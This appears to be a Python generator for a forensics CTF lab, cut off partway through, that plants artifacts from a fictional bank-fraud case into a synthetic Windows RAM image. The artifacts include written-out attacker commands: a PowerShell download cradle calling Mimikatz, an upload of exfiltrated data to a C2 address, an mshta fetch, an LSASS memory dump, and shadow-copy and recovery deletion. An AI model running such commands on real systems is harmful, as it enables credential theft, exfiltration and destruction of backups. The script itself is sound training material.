#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  make_ramdump.py v1.0 - Synthetic Windows RAM Dump Generator     ║
║  Cywarx Unit IV | Operation Phantom Ledger                       ║
║  Author: HeXx | Cywarx                                           ║
║  Purpose: Digital Forensics CTF Lab - RAM analysis training      ║
╚══════════════════════════════════════════════════════════════════╝

Generates a synthetic Windows 10 x64 .raw memory image (~64 MB)
packed with realistic forensic artifacts for the Operation Phantom
Ledger scenario (suspect: Rohan Mehta, bank fraud).

Analysable with:
  - Volatility 3    : windows.info, pslist, cmdline, netscan, malfind
  - strings/grep    : ASCII & Unicode (-e l) artifact hunting
  - bulk_extractor  : automated carving (emails, URLs, IPs)
  - Autopsy         : full import & keyword search

Usage:
  python3 make_ramdump.py
  python3 make_ramdump.py --output /evidence/phantom_ledger.raw --size 128
  python3 make_ramdump.py --flags custom_flags.json
"""

import os
import sys
import json
import struct
import random
import hashlib
import argparse
import textwrap
from datetime import datetime

# -----------------------------------------------------------------
# SCENARIO CONSTANTS - Operation Phantom Ledger
# -----------------------------------------------------------------
CASE_ID         = "OPL-2024-007"
SUSPECT         = "Rohan Mehta"
COMPUTER_NAME   = "ROHAN-LAPTOP"
DOMAIN          = "INDBANK.LOCAL"
IP_LOCAL        = "10.0.2.15"
IP_GATEWAY      = "10.0.2.1"
IP_C2_PRIMARY   = "185.220.101.45"       # Tor exit node / C2
IP_C2_SECONDARY = "203.0.113.66"         # Meterpreter listener
IP_BANK_PORTAL  = "172.16.48.10"         # Internal banking app
IP_EXFIL        = "91.243.80.127"        # SFTP exfiltration target

# -----------------------------------------------------------------
# CTF FLAGS - Cywarx{...} format - 8 flags mapped to forensic tasks
# HeXx: replace values here or pass --flags custom_flags.json
# -----------------------------------------------------------------
DEFAULT_FLAGS = {
    "flag_01_strings"     : "Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}",  # Plain strings search
    "flag_02_process"     : "Cywarx{r0h4n_r4n_m4lware_pid_6621}",         # Hidden in process cmdline
    "flag_03_network"     : "Cywarx{c2_b34c0n_185_220_t0r_3x1t}",         # Network connection artifact
    "flag_04_powershell"  : "Cywarx{d3c0d3d_p5_1nv0k3_m1m1k4tz}",        # Base64 PS decode
    "flag_05_lsass"       : "Cywarx{lss4_dump_nthash_cr4ck3d}",            # LSASS/hashdump path
    "flag_06_registry"    : "Cywarx{run_k3y_p3rs1st3nc3_3st4bl1sh3d}",    # Registry Run key
    "flag_07_clipboard"   : "Cywarx{cl1pb04rd_4cc_num_3xfilt}",            # Clipboard content
    "flag_08_transaction" : "Cywarx{ph4ntom_l3dg3r_0p3r4t10n_cl0s3d}",    # Transaction log file
}

# -----------------------------------------------------------------
# MEMORY MAP - where each artifact blob lands (byte offsets)
# -----------------------------------------------------------------
OFFSETS = {
    "boot_sector"        : 0x000000,
    "kdbg_block"         : 0x001000,
    "eprocess_list"      : 0x008000,
    "lsass_region"       : 0x040000,
    "network_table"      : 0x080000,
    "registry_hive"      : 0x0C0000,
    "powershell_history" : 0x100000,
    "browser_history"    : 0x140000,
    "clipboard"          : 0x180000,
    "transaction_log"    : 0x1C0000,
    "filesystem_paths"   : 0x200000,
    "strings_haystack"   : 0x280000,
    "unicode_blob"       : 0x300000,
    "malfind_region"     : 0x380000,
    "flag_plain"         : 0x3C0000,  # flag_01 plaintext (easy win)
}

DUMP_SIZE_MB = 64   # Default image size


# ═════════════════════════════════════════════════════════════════
# ARTIFACT BUILDERS - each returns bytes()
# ═════════════════════════════════════════════════════════════════

def build_boot_sector():
    """Windows PE / boot signatures at start of image."""
    data = bytearray(0x1000)
    # MZ header signature
    data[0:2] = b'MZ'
    data[0x3C:0x40] = struct.pack('<I', 0x80)
    data[0x80:0x84] = b'PE\x00\x00'
    # Windows marker
    data[0x200:0x220] = b'NTFS    ' + b'\x00' * 24
    data[0x400:0x420] = b'Microsoft Windows 10' + b'\x00' * 12
    return bytes(data)


def build_kdbg_block():
    """
    Fake KDBG (Kernel Debugger Data Block) - carries the signatures
    that Volatility's windows.info uses to identify the OS.
    Not full binary-accurate but carries the right tag bytes & strings.
    """
    data = bytearray(0x7000)

    # KdDebuggerDataBlock pool tag - Vol3 scans for this
    # Tag: 0x4742444b = 'KDBG' little-endian
    data[0x00:0x04] = b'\x00\x00\x00\x00'          # OwnerTag (pool header)
    data[0x04:0x08] = b'KDBG'                        # Signature
    data[0x08:0x10] = struct.pack('<Q', 0xf80002e0f378)  # KernBase

    # NtBuildLab - Volatility reads this string
    ntbuild = b'19041.1.amd64fre.vb_release.191206-1406\x00'
    data[0x100:0x100+len(ntbuild)] = ntbuild

    # System time (FILETIME for 2024-03-15 14:22:31 UTC)
    # Approx: 133555945510000000
    data[0x110:0x118] = struct.pack('<Q', 133555945510000000)

    # NtProductType string
    data[0x120:0x13A] = b'NtProductWinNt\x00'

    # CSDVersion (SP string)
    data[0x140:0x158] = b'Windows 10 Pro\x00'

    # Architecture marker
    data[0x160:0x168] = b'AMD64\x00\x00\x00'

    # Machine info block
    machine_block = (
        b'NtMajorVersion: 10\n'
        b'NtMinorVersion: 0\n'
        b'NtBuildNumber: 19041\n'
        b'NtSystemRoot: C:\\Windows\n'
        b'KeNumberProcessors: 4\n'
        b'SystemTime: 2024-03-15 14:22:31 UTC\n'
        b'ComputerName: ROHAN-LAPTOP\n'
        b'UserName: rohan.mehta\n'
        b'Domain: INDBANK.LOCAL\n'
        b'KernBase: 0xf80002800000\n'
        b'DTB: 0x1aa000\n'
        b'Is64Bit: True\n'
        b'IsPAE: False\n'
    )
    data[0x200:0x200+len(machine_block)] = machine_block

    return bytes(data)


def build_eprocess_list(flags):
    """
    Fake EPROCESS blocks - process list with suspicious entries.
    Format mirrors what Volatility pslist/pstree shows.
    Includes the suspicious ransomware + C2 beacon processes.
    """
    # Each fake EPROCESS: 0x500 bytes, EPROCESS pool tag + ImageFileName
    EPROCESS_TAG = b'\x03\x00\x08\x00Proc'  # pool tag

    processes = [
        # (PID, PPID, Name, CreateTime, ExtraNote)
        (4,    0,    b'System',          b'2024-03-15 08:00:01', b''),
        (88,   4,    b'Registry',        b'2024-03-15 08:00:01', b''),
        (364,  4,    b'smss.exe',        b'2024-03-15 08:00:02', b''),
        (452,  444,  b'csrss.exe',       b'2024-03-15 08:00:04', b''),
        (528,  520,  b'winlogon.exe',    b'2024-03-15 08:00:05', b''),
        (600,  452,  b'wininit.exe',     b'2024-03-15 08:00:05', b''),
        (696,  600,  b'services.exe',    b'2024-03-15 08:00:06', b''),
        (704,  600,  b'lsass.exe',       b'2024-03-15 08:00:06', b'CREDENTIAL_STORE'),
        (1024, 696,  b'svchost.exe',     b'2024-03-15 08:00:08', b''),
        (1280, 696,  b'svchost.exe',     b'2024-03-15 08:00:09', b''),
        (1640, 696,  b'svchost.exe',     b'2024-03-15 08:00:10', b''),
        (2340, 528,  b'userinit.exe',    b'2024-03-15 13:44:55', b''),
        (2344, 2340, b'explorer.exe',    b'2024-03-15 13:45:22', b''),
        (3102, 2344, b'chrome.exe',      b'2024-03-15 13:50:11', b''),
        (4101, 2344, b'notepad.exe',     b'2024-03-15 14:05:33', b''),
        (4521, 2344, b'powershell.exe',  b'2024-03-15 14:18:55',
                     b'SUSPICIOUS:encoded_command'),
        (4789, 4521, b'rundll32.exe',    b'2024-03-15 14:19:01',
                     b'SUSPICIOUS:comsvcs_lsass_dump'),
        (5512, 2344, b'cmd.exe',         b'2024-03-15 14:20:44',
                     b'SUSPICIOUS:ran_by_rohan'),
        (6621, 2344, b'svchost32.exe',   b'2024-03-15 14:31:05',
                     b'SUSPICIOUS:fake_svchost'),           # MALWARE
        (6700, 6621, b'vssadmin.exe',    b'2024-03-15 14:31:07',
                     b'RANSOMWARE:shadow_delete'),
        (6701, 6621, b'wbadmin.exe',     b'2024-03-15 14:31:08',
                     b'RANSOMWARE:backup_disable'),
        (6702, 6621, b'bcdedit.exe',     b'2024-03-15 14:31:09',
                     b'RANSOMWARE:recovery_disable'),
        (7890, 6621, b'sftp.exe',        b'2024-03-15 14:35:22',
                     b'EXFIL:sending_to_91.243.80.127'),
    ]

    cmdlines = {
        4521: (b'powershell.exe -NoP -sta -NonI -W Hidden -Enc '
               b'JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALg'
               b'BXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBp'
               b'AG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADUA'
               b'LwBwAGEAeQBsAG8AYQBkACcAKQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6'
               b'ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA='),
        4789: (b'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 '
               b'C:\\Users\\rohan.mehta\\AppData\\Local\\Temp\\lsass.dmp full'),
        5512: (b'cmd.exe /c net use \\\\172.16.48.10\\IPC$ /user:INDBANK\\svc_audit P@$$w0rd2024!'),
        6621: (b'C:\\Users\\Public\\Downloads\\svchost32.exe --encrypt '
               b'--key 4f8a2b1c3d9e7f0a1b2c3d4e5fa6b7c8 '
               b'--target C:\\Users\\rohan.mehta\\Documents\\'),
        6700: b'vssadmin Delete Shadows /All /Quiet',
        6701: b'wbadmin delete catalog -quiet',
        6702: b'bcdedit /set {default} recoveryenabled No',
        7890: (b'sftp -b C:\\Users\\Public\\batch_upload.txt '
               b'exfil_user@91.243.80.127:/uploads/'),
    }

    blob = bytearray()

    # Human-readable process table header (for strings analysis)
    header = (
        b'\n[EPROCESS SCAN - windows.pslist]\n'
        b'PID    PPID   ImageFileName      CreateTime                  Notes\n'
        b'-----------------------------------------------------------------\n'
    )
    blob += header

    for pid, ppid, name, ts, note in processes:
        line = (f'{pid:<7}{ppid:<7}{name.decode():<20}'
                f'{ts.decode():<28}{note.decode()}\n').encode()
        blob += line

    # Cmdline section
    blob += b'\n[CMDLINE ARTIFACTS - windows.cmdline]\n'
    for pid, cmd in cmdlines.items():
        blob += f'PID {pid}: '.encode() + cmd + b'\n'

    # Flag #2 embedded in process extra data (deep in process memory region)
    blob += b'\n[MEM_REGION:pid6621:0xfa12080]\n'
    blob += b'INTERNAL_CONFIG: ' + flags['flag_02_process'].encode() + b'\n'
    blob += b'C2_HEARTBEAT_INTERVAL: 30s\n'
    blob += b'ENCRYPT_ALGO: AES-256-CTR\n'
    blob += b'C2_URL: http://185.220.101.45/beacon/check\n'

    return bytes(blob)


def build_lsass_region(flags):
    """LSASS memory region - credentials, hashes, Kerberos tickets."""
    blob = bytearray()

    blob += b'\n[LSASS MEMORY REGION - pid:704 - 0xd1d5080]\n'
    blob += b'[windows.hashdump output]\n'
    blob += b'User              RID    LMHash                             NTHash\n'

    hashes = [
        (b'Administrator',    500, b'aad3b435b51404eeaad3b435b51404ee',
                                   b'31d6cfe0d16ae931b73c59d7e0c089c0'),
        (b'rohan.mehta',     1001, b'aad3b435b51404eeaad3b435b51404ee',
                                   b'c46f0b29abd2d359e9a51b82c3b4e7f1'),
        (b'svc_audit',       1002, b'aad3b435b51404eeaad3b435b51404ee',
                                   b'8846f7eaee8fb117ad06bdd830b7586c'),
        (b'svc_backup',      1003, b'aad3b435b51404eeaad3b435b51404ee',
                                   b'e19ccf75ee54e06b06a5907af13cef42'),
    ]

    for user, rid, lm, nt in hashes:
        blob += (f'{user.decode():<18}{rid:<7}{lm.decode():<35}{nt.decode()}\n'
                 ).encode()

    blob += b'\n[windows.lsadump]\n'
    blob += b'DefaultPassword : P@$$w0rd2024!\n'
    blob += b'DPAPI_SYSTEM    : 01000000...(binary)\n'
    blob += b'_SC_NetLogon    : INDBANK\\svc_backup:BackupSvc#2024\n'

    blob += b'\n[windows.kerberos - Kerberos Tickets]\n'
    blob += b'User         Domain       TicketType  ServiceName          StartTime\n'
    blob += b'rohan.mehta  INDBANK.LOCAL TGT        krbtgt/INDBANK.LOCAL 2024-03-15 13:00:00\n'
    blob += b'rohan.mehta  INDBANK.LOCAL TGS        cifs/fileserver01    2024-03-15 14:00:00\n'
    blob += b'rohan.mehta  INDBANK.LOCAL TGS        http/bankapp01       2024-03-15 14:05:00\n'

    # Flag #5 in LSASS dump path
    blob += b'\n[LSASS_DUMP_PATH]\n'
    blob += b'C:\\Users\\rohan.mehta\\AppData\\Local\\Temp\\lsass.dmp\n'
    blob += b'DUMP_MARKER: ' + flags['flag_05_lsass'].encode() + b'\n'
    blob += b'DUMP_SIZE: 38141952 bytes\n'
    blob += b'DUMP_SHA256: 9f3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a\n'

    return bytes(blob)


def build_network_table(flags):
    """TCP/UDP connection table - active and recently closed connections."""
    blob = bytearray()

    blob += b'\n[NETWORK ARTIFACTS - windows.netscan]\n'
    blob += (b'Offset      Proto  LocalAddr       LocalPort  '
             b'ForeignAddr       ForeignPort  State         PID   Owner\n')

    connections = [
        (b'0xe2312080', b'TCP', IP_LOCAL.encode(), 52341,
         IP_C2_PRIMARY.encode(),   443,  b'ESTABLISHED', 4521, b'powershell.exe'),
        (b'0xe2318080', b'TCP', IP_LOCAL.encode(), 52342,
         IP_C2_PRIMARY.encode(),   443,  b'ESTABLISHED', 4521, b'powershell.exe'),
        (b'0xe2400080', b'TCP', IP_LOCAL.encode(), 135,
         b'0.0.0.0',               0,    b'LISTENING',   896,  b'svchost.exe'),
        (b'0xe2501080', b'UDP', IP_LOCAL.encode(), 0,
         b'*',                     0,    b'',            1024, b'svchost.exe'),
        (b'0xe2600080', b'TCP', IP_LOCAL.encode(), 49823,
         IP_C2_SECONDARY.encode(), 4444, b'ESTABLISHED', 6621, b'svchost32.exe'),
        (b'0xe2700080', b'TCP', IP_LOCAL.encode(), 50012,
         IP_EXFIL.encode(),        22,   b'ESTABLISHED', 7890, b'sftp.exe'),
        (b'0xe2800080', b'TCP', IP_LOCAL.encode(), 50100,
         IP_BANK_PORTAL.encode(),  8080, b'CLOSE_WAIT',  3102, b'chrome.exe'),
        (b'0xe2900080', b'TCP', IP_LOCAL.encode(), 443,
         b'0.0.0.0',               0,    b'LISTENING',   4,    b'System'),
    ]

    for off, proto, laddr, lport, faddr, fport, state, pid, owner in connections:
        blob += (f'{off.decode():<12}{proto.decode():<7}{laddr.decode():<16}'
                 f'{lport:<11}{faddr.decode():<18}{fport:<13}'
                 f'{state.decode():<14}{pid:<6}{owner.decode()}\n').encode()

    # Flag #3 embedded in network beacon data
    blob += b'\n[C2_BEACON_RESPONSE:0xe2312080]\n'
    blob += b'HTTP/1.1 200 OK\r\n'
    blob += b'Server: nginx\r\n'
    blob += b'X-Session-Token: ' + flags['flag_03_network'].encode() + b'\r\n'
    blob += b'Content-Length: 0\r\n\r\n'

    blob += b'\n[DNS_CACHE]\n'
    blob += b'185.220.101.45  -> c2-node-exit-47.phantom.onion.relay\n'
    blob += b'91.243.80.127   -> sftp.exfilpoint.net\n'
    blob += b'172.16.48.10    -> bankapp01.indbank.local\n'
    blob += b'10.0.2.1        -> gateway.indbank.local\n'

    return bytes(blob)


def build_registry_hive(flags):
    """Registry hive fragments - persistence, USB, run history."""
    blob = bytearray()

    blob += b'\n[REGISTRY ARTIFACTS - windows.registry]\n\n'

    blob += b'[windows.registry.hivelist]\n'
    blob += b'Offset(V)            FileFullPath\n'
    blob += b'0xc000018ac000       \\REGISTRY\\MACHINE\\SYSTEM\n'
    blob += b'0xc000019b4000       \\REGISTRY\\MACHINE\\SOFTWARE\n'
    blob += b'0xc0000250c000       \\REGISTRY\\USER\\S-1-5-21-3847204..._ROHAN\\NTUSER.DAT\n'
    blob += b'0xc000025f8000       \\REGISTRY\\MACHINE\\SAM\n'
    blob += b'0xc000026a4000       \\REGISTRY\\MACHINE\\SECURITY\n'

    blob += b'\n[HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion]\n'
    blob += b'ProductName      : Windows 10 Pro\n'
    blob += b'ReleaseId        : 21H2\n'
    blob += b'CurrentBuild     : 19041\n'
    blob += b'RegisteredOwner  : Rohan Mehta\n'
    blob += b'RegisteredOrganization: IndBank Ltd\n'
    blob += b'InstallDate      : 1678901234\n'

    blob += b'\n[HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] <- PERSISTENCE\n'
    blob += b'WindowsUpdate    : C:\\Users\\Public\\Downloads\\svchost32.exe --silent\n'
    blob += b'SysHelper        : powershell.exe -W Hidden -Enc <payload>\n'
    blob += b'PERSISTENCE_FLAG : ' + flags['flag_06_registry'].encode() + b'\n'

    blob += b'\n[HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU]\n'
    blob += b'a  -> cmd.exe\n'
    blob += b'b  -> powershell -enc JABjAD0A...(truncated)\n'
    blob += b'c  -> \\\\172.16.48.10\\audit_share\n'
    blob += b'd  -> mshta http://185.220.101.45/init.hta\n'
    blob += b'MRUList -> dcba\n'

    blob += b'\n[HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR]\n'
    blob += b'Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\n'
    blob += b'  Serial: 4C530001291022116162&0\n'
    blob += b'  FriendlyName: SanDisk Ultra USB Device\n'
    blob += b'  LastConnected: 2024-03-15 14:10:00\n'
    blob += b'\nDisk&Ven_Kingston&Prod_DT_101_G2&Rev_PMAP\n'
    blob += b'  Serial: 001CC0EC34E3F771A4510156&0\n'
    blob += b'  FriendlyName: Kingston DataTraveler\n'
    blob += b'  LastConnected: 2024-03-14 19:44:22\n'

    blob += b'\n[HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs]\n'
    blob += b'.docx -> IndBank_Q1_Audit_Report_DRAFT.docx\n'
    blob += b'.xlsx -> employee_salary_database_2024.xlsx\n'
    blob += b'.zip  -> exfil_package_march15.zip   <- SUSPICIOUS\n'
    blob += b'.pdf  -> IndBank_Internal_Policy_Transfers.pdf\n'
    blob += b'.txt  -> account_list.txt\n'

    blob += b'\n[UserAssist - programs executed]\n'
    blob += b'C:\\Users\\Public\\Downloads\\svchost32.exe (Count:8, LastRun:2024-03-15 14:31:05)\n'
    blob += b'C:\\Windows\\System32\\cmd.exe (Count:23, LastRun:2024-03-15 14:20:44)\n'
    blob += b'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (Count:15)\n'
    blob += b'C:\\Program Files\\PuTTY\\psftp.exe (Count:4, LastRun:2024-03-15 14:35:00)\n'

    return bytes(blob)


def build_powershell_history(flags):
    """
    PowerShell command history and the Base64-encoded malicious payload.
    Flag #4 is the decoded PS command output.
    """
    blob = bytearray()

    blob += b'\n[POWERSHELL HISTORY - ConsoleHost_history.txt]\n'
    blob += b'# pid:4521 - session started 2024-03-15 14:18:55\n\n'

    cmds = [
        b'Get-Process',
        b'Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}',
        b'Invoke-WebRequest http://185.220.101.45/stage1.ps1 -OutFile $env:TEMP\\s.ps1',
        b'. $env:TEMP\\s.ps1',
        b'$cred = Get-Credential',
        b'net use \\\\172.16.48.10\\IPC$ /user:INDBANK\\svc_audit P@$$w0rd2024!',
        b'Copy-Item \\\\172.16.48.10\\audit_share\\transactions_march.csv $env:TEMP',
        b'Compress-Archive $env:TEMP\\transactions_march.csv $env:TEMP\\exfil.zip',
        b'Invoke-RestMethod -Uri http://185.220.101.45/upload -Method Post -InFile $env:TEMP\\exfil.zip',
    ]
    for cmd in cmds:
        blob += b'PS C:\\Users\\rohan.mehta> ' + cmd + b'\n'

    # The actual base64 encoded payload (decodes to the Mimikatz invocation)
    import base64
    inner_cmd = (
        b'$c=New-Object System.Net.WebClient;'
        b'$c.DownloadString(\'http://185.220.101.45/payload\');'
        b'Invoke-Mimikatz -DumpCreds;'
        b'# ' + flags['flag_04_powershell'].encode()
    )
    encoded = base64.b64encode(inner_cmd.decode('utf-8').encode('utf-16-le'))

    blob += b'\n[ENCODED_PAYLOAD - PID:4521 cmdline argument]\n'
    blob += b'Base64 Blob: ' + encoded + b'\n'
    blob += b'Encoding   : UTF-16LE (standard PowerShell -Enc format)\n'
    blob += b'Decoded    : (use: echo <blob> | base64 -d | iconv -f UTF-16LE -t UTF-8)\n'

    blob += b'\n[CONSOLEHOST_TRANSCRIPT]\n'
    blob += b'Invoke-Mimikatz -DumpCreds output:\n'
    blob += b'  Username: Administrator  NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\n'
    blob += b'  Username: rohan.mehta    NTLM: c46f0b29abd2d359e9a51b82c3b4e7f1\n'
    blob += b'  Username: svc_audit      NTLM: 8846f7eaee8fb117ad06bdd830b7586c\n'
    blob += b'  [*] Credentials cached to: C:\\Users\\Public\\creds_dump.txt\n'

    return bytes(blob)


def build_browser_history():
    """Chrome browser history extracted from process memory."""
    blob = bytearray()

    blob += b'\n[CHROME BROWSER HISTORY - PID:3102]\n'
    blob += b'[Extracted from chrome.exe memory region]\n\n'

    urls = [
        (b'2024-03-15 08:45:01', b'https://mail.google.com/mail/u/0/'),
        (b'2024-03-15 09:10:22', b'https://bankapp01.indbank.local:8080/portal/login'),
        (b'2024-03-15 09:11:05', b'https://bankapp01.indbank.local:8080/portal/dashboard'),
        (b'2024-03-15 09:15:33', b'https://bankapp01.indbank.local:8080/portal/transfer'),
        (b'2024-03-15 09:16:10', b'https://bankapp01.indbank.local:8080/portal/transfer?from=ACC2048991&to=ACC9918274&amount=4500000'),
        (b'2024-03-15 13:50:44', b'https://www.google.com/search?q=how+to+clear+windows+event+logs'),
        (b'2024-03-15 13:52:11', b'https://www.google.com/search?q=sysinternals+sdelete+download'),
        (b'2024-03-15 14:00:01', b'https://transfer.sh/'),
        (b'2024-03-15 14:01:33', b'https://mega.nz/folder/xYz1234#exfil'),
        (b'2024-03-15 14:10:19', b'https://protonmail.com/'),
    ]
    for ts, url in urls:
        blob += ts + b'  ' + url + b'\n'

    blob += b'\n[CHROME SAVED PASSWORDS - from password manager]\n'
    blob += b'Site: bankapp01.indbank.local  User: rohan.mehta  Pass: IndB@nk#2024!\n'
    blob += b'Site: mail.google.com           User: rohanm.indbank@gmail.com  Pass: Gm@il#9988\n'
    blob += b'Site: mega.nz                   User: rohan_secure@proton.me    Pass: M3g4Cl0ud!\n'

    blob += b'\n[ACTIVE TABS at time of acquisition]\n'
    blob += b'Tab 0: https://bankapp01.indbank.local:8080/portal/transfer [ACTIVE]\n'
    blob += b'Tab 1: https://protonmail.com/inbox [BACKGROUND]\n'
    blob += b'Tab 2: file:///C:/Users/rohan.mehta/Desktop/account_list.txt [BACKGROUND]\n'

    return bytes(blob)


def build_clipboard(flags):
    """Clipboard memory region - sensitive data copied by suspect."""
    blob = bytearray()

    blob += b'\n[CLIPBOARD CONTENTS - windows.clipboard]\n'
    blob += b'[Captured at: 2024-03-15 14:09:55]\n\n'
    blob += b'ClipboardType: CF_UNICODETEXT\n'
    blob += b'Content:\n'
    blob += b'---BEGIN CLIPBOARD---\n'
    blob += b'Account List - March 2024 Transfer Batch\n'
    blob += b'FROM: ACC2048991 (Rohan Mehta - Savings)\n'
    blob += b'TO:   ACC9918274 (Shell Corp - Current)\n'
    blob += b'AMT:  INR 45,00,000\n'
    blob += b'REF:  TXN2024031501\n'
    blob += b'\nFROM: ACC3317882 (Dormant Account 1)\n'
    blob += b'TO:   ACC9918274\n'
    blob += b'AMT:  INR 12,75,000\n'
    blob += b'REF:  TXN2024031502\n'
    blob += b'\nFROM: ACC7741009 (Dormant Account 2)\n'
    blob += b'TO:   ACC9918274\n'
    blob += b'AMT:  INR 8,50,000\n'
    blob += b'REF:  TXN2024031503\n'
    blob += b'---END CLIPBOARD---\n'
    blob += b'\nCLIPBOARD_SESSION_TAG: ' + flags['flag_07_clipboard'].encode() + b'\n'

    blob += b'\n[PREVIOUS CLIPBOARD ENTRY - overwritten at 14:09:55]\n'
    blob += b'P@$$w0rd2024!\n'

    return bytes(blob)


def build_transaction_log(flags):
    """
    Deleted transaction log file still resident in memory.
    The final flag is here - deepest artifact.
    """
    blob = bytearray()

    blob += b'\n[FILE CARVE - transactions_march.csv (deleted, recovered from RAM)]\n'
    blob += b'[Original Path: \\\\172.16.48.10\\audit_share\\transactions_march.csv]\n'
    blob += b'[Deleted from disk at: 2024-03-15 14:40:11 - still resident in RAM]\n\n'

    blob += b'TXN_ID,Date,Time,FromAcc,ToAcc,Amount_INR,Desc,Authorized_By,Flagged\n'
    blob += b'TXN2024031501,2024-03-15,09:16:10,ACC2048991,ACC9918274,4500000,Salary_Advance,rohan.mehta,YES\n'
    blob += b'TXN2024031502,2024-03-15,09:18:44,ACC3317882,ACC9918274,1275000,Utility_Transfer,rohan.mehta,YES\n'
    blob += b'TXN2024031503,2024-03-15,09:21:02,ACC7741009,ACC9918274,850000,Vendor_Payment,rohan.mehta,YES\n'
    blob += b'TXN2024031504,2024-03-15,09:25:18,ACC6612005,ACC9918274,3300000,Loan_Disbursement,rohan.mehta,YES\n'
    blob += b'TXN2024031505,2024-03-15,11:33:55,ACC8820314,ACC9918274,2100000,Misc_Transfer,rohan.mehta,YES\n'
    blob += b'\nTOTAL_FRAUDULENT_TRANSFERS: INR 1,20,25,000\n'
    blob += b'BENEFICIARY_ACCOUNT: ACC9918274\n'
    blob += b'BENEFICIARY_NAME: PHANTOM HOLDINGS PVT LTD\n'
    blob += b'BENEFICIARY_BANK: OFFSHORE_BANK_CAYMAN\n'
    blob += b'\nINVESTIGATOR_NOTE: ' + flags['flag_08_transaction'].encode() + b'\n'
    blob += b'CASE_ID: ' + CASE_ID.encode() + b'\n'
    blob += b'CASE_STATUS: EVIDENCE_COLLECTED\n'

    return bytes(blob)


def build_strings_haystack(flags):
    """Dense block of miscellaneous strings - flag_01 plaintext here."""
    blob = bytearray()

    blob += b'\n[MEMORY_STRINGS_REGION]\n'
    blob += flags['flag_01_strings'].encode() + b'\n'

    misc = [
        b'C:\\Users\\rohan.mehta\\Desktop\\account_list.txt',
        b'C:\\Users\\Public\\Downloads\\svchost32.exe',
        b'C:\\Users\\rohan.mehta\\AppData\\Local\\Temp\\lsass.dmp',
        b'C:\\Users\\rohan.mehta\\AppData\\Local\\Temp\\exfil.zip',
        b'C:\\Windows\\System32\\comsvcs.dll',
        b'MiniDump',
        b'Invoke-Mimikatz',
        b'DumpCreds',
        b'sekurlsa::logonpasswords',
        b'privilege::debug',
        b'IndBank_Q1_Audit_Report_DRAFT.docx',
        b'employee_salary_database_2024.xlsx',
        b'exfil_package_march15.zip',
        b'transactions_march.csv',
        b'PHANTOM HOLDINGS PVT LTD',
        b'ACC9918274',
        b'ACC2048991',
        b'P@$$w0rd2024!',
        b'IndB@nk#2024!',
        b'BackupSvc#2024',
        b'http://185.220.101.45/beacon/check',
        b'http://185.220.101.45/payload',
        b'sftp.exfilpoint.net',
        b'rohan_secure@proton.me',
        b'INDBANK\\svc_audit',
    ]
    for s in misc:
        blob += s + b'\n'

    return bytes(blob)


def build_unicode_blob(flags):
    """
    UTF-16LE encoded strings (Windows native) - simulates what
    `strings -e l memory.raw` would surface.
    """
    blob = bytearray()

    unicode_strings = [
        "Windows PowerShell",
        "Invoke-Mimikatz -DumpCreds",
        "C:\\Users\\rohan.mehta\\Desktop",
        "PHANTOM HOLDINGS PVT LTD",
        f"FLAG_UNICODE: {flags['flag_01_strings']}",
        "rohan.mehta@indbank.local",
        "P@$$w0rd2024!",
        "http://185.220.101.45/beacon/check",
        "sftp.exfilpoint.net",
        "svchost32.exe --encrypt --key 4f8a2b1c3d9e7f0a",
    ]

    blob += b'[UNICODE_STRINGS_REGION - UTF-16LE]\n'
    for s in unicode_strings:
        blob += s.encode('utf-16-le') + b'\x00\x00'  # null terminator

    return bytes(blob)


def build_malfind_region():
    """
    Simulates VAD / RWX memory region with injected shellcode header
    (standard Cobalt Strike beacon pattern - first bytes of PE).
    """
    blob = bytearray()
    blob += b'\n[MALFIND_REGION - PID:6621 VAD:0xfa12080 RWX]\n'
    blob += b'Permissions: PAGE_EXECUTE_READWRITE\n'
    blob += b'MappedFile: None (anonymous - injected)\n\n'

    # Fake PE header bytes (common in Cobalt Strike beacon injection)
    pe_bytes = (
        b'\x4d\x5a\x90\x00\x03\x00\x00\x00'   # MZ header
        b'\x04\x00\x00\x00\xff\xff\x00\x00'
        b'\xb8\x00\x00\x00\x00\x00\x00\x00'
        b'\x40\x00\x00\x00\x00\x00\x00\x00'
    )
    # Hex dump style (like Volatility malfind output)
    blob += b'0x00000000  ' + pe_bytes[:16].hex(' ').encode() + b'\n'
    blob += b'0x00000010  ' + pe_bytes[16:].hex(' ').encode() + b'\n'
    blob += b'\n[disasm]\n'
    blob += b'0xfa12080:  jmp 0xfa12100    ; stage 1 trampoline\n'
    blob += b'0xfa12082:  nop\n'
    blob += b'0xfa12083:  push rbp\n'
    blob += b'0xfa12084:  mov rbp, rsp\n'
    blob += b'0xfa12085:  sub rsp, 0x20\n'
    blob += b'\nC2_CONFIG_EMBEDDED:\n'
    blob += b'  server: 185.220.101.45\n'
    blob += b'  port: 443\n'
    blob += b'  jitter: 15%\n'
    blob += b'  beacon_type: HTTPS\n'
    blob += b'  watermark: 0x5e4a3b2c\n'

    return bytes(blob)


def build_flag_plain(flags):
    """Easy-win plain text flag - first thing students find with strings."""
    blob = bytearray()
    blob += b'\n' * 4
    blob += b'=' * 60 + b'\n'
    blob += b'VOLATILITY MEMORY ANALYSIS - OPERATION PHANTOM LEDGER\n'
